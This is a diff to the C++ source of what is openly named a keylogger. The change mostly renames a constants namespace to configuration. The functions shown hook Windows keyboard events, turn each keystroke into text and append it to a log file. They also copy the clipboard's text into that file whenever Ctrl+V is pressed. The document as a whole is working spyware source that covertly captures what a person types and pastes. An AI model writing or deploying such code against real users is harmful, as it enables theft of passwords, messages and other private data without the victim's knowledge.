@@ -1,21 +1,19 @@
 #include "keylogger.h"
 #include "keyboard.h"
-#include "constants.h"
+#include "configuration.h"
 #include <cstdint>
 
-namespace keylogger 
+void keylogger::log_kbd(const KBDLLHOOKSTRUCT* kbd_hook)
 {
-void log_kbd(const KBDLLHOOKSTRUCT* kbd_hook)
-{
-	std::wofstream out_file{ constants::out_file, std::ofstream::app };
+	std::wofstream out_file{ configuration::out_file, std::ofstream::app };
 
-	if (constants::key_codes.find(kbd_hook->vkCode) != constants::key_codes.cend())
+	if (configuration::key_codes.find(kbd_hook->vkCode) != configuration::key_codes.cend())
 	{
-		out_file << constants::key_codes.at(kbd_hook->vkCode);
+		out_file << configuration::key_codes.at(kbd_hook->vkCode);
 	}
 	else if (keyboard::is_control_down())
 	{
-		if (kbd_hook->vkCode == constants::virtual_key_v) 
+		if (kbd_hook->vkCode == configuration::virtual_key_v)
 		{
 			write_clipboard_data(out_file);
 		}
@@ -26,32 +24,31 @@ void log_kbd(const KBDLLHOOKSTRUCT* kbd_hook)
 	}
 	else
 	{
-		BYTE state[constants::keyboard_state_size];
+		BYTE state[configuration::keyboard_state_size];
 		keyboard::get_state(state);
 
-		WCHAR key_buffer[constants::key_buffer_size];
-		const auto result = ToUnicode(kbd_hook->vkCode, kbd_hook->scanCode, state, key_buffer, constants::key_buffer_size, 0);
+		WCHAR key_buffer[configuration::key_buffer_size];
+		const auto result = ToUnicode(kbd_hook->vkCode, kbd_hook->scanCode, state, key_buffer, configuration::key_buffer_size, 0);
 
 		if (result > 0) out_file << key_buffer;
 	}
 }
 
-	void write_clipboard_data(std::wofstream& stream)
+void keylogger::write_clipboard_data(std::wofstream& stream)
+{
+	if (OpenClipboard(nullptr))
 	{
-		if (OpenClipboard(nullptr))
+		auto handle = GetClipboardData(CF_UNICODETEXT);
+
+		if (handle != nullptr)
 		{
-			auto handle = GetClipboardData(CF_UNICODETEXT);
+			const WCHAR* const buffer = static_cast<WCHAR*>(GlobalLock(handle));
 
-			if (handle != nullptr)
-			{
-				const WCHAR* const buffer = static_cast<WCHAR*>(GlobalLock(handle));
+			if (buffer != nullptr) stream << buffer;
 
-				if (buffer != nullptr) stream << buffer;
-
-				GlobalUnlock(handle);
-			}
-
-			CloseClipboard();
+			GlobalUnlock(handle);
 		}
+
+		CloseClipboard();
 	}
 }
